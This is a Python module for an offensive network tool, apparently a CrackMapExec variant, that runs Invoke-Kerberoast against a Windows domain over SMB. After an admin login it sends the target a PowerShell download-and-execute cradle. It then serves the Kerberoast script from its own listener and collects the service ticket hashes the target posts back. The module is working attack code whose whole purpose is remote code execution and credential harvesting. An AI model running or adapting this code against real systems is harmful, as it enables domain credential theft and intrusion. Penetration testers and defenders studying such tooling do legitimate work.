from cmx.helpers.powershell import clean_ps_script, gen_ps_iex_cradle

from cmx.helpers.logger import write_log, highlight
from datetime import datetime
from cmx import config as cfg
import pdb

class CMXModule:
    '''
        Executes Invoke-Kerberoast.ps1 script

    '''

    name = 'kerberoast'
    description = "Kerberoasts all found SPNs for the current domain"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        """
    Module Options:
        No options
cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Credential $Cred -Verbose -Domain testlab.local'

        """
        #self.command = '-Credential $Cred -Verbose -Domain testlab.local'
        #self.command = ''
        #if module_options and 'COMMAND' in module_options:
        #    self.command = module_options['COMMAND']


        self.ps_script = clean_ps_script('powershell_scripts/Invoke-Kerberoast.ps1')

    def on_admin_login(self, context, connection):
        command = "Invoke-Kerberoast -Domain OCEAN.DEPTH -Server 10.10.33.100"

        launcher = gen_ps_iex_cradle(context, 'Invoke-Kerberoast.ps1', command, server_os=connection.server_os)

        connection.ps_execute(launcher)

        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-Kerberoast.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            request.wfile.write(self.ps_script.encode()) #self.ps_script is the ps1 script itself

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('Content-Length'))
        data = response.rfile.read(length)

        # We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            lines = data.decode().split("             ")
            for line in lines:
                #line = line.replace('\r\n', '\n').strip()
                context.log.highlight(line)
        else:
            context.log.info("No Results ¯\\_('_')_/¯")
        return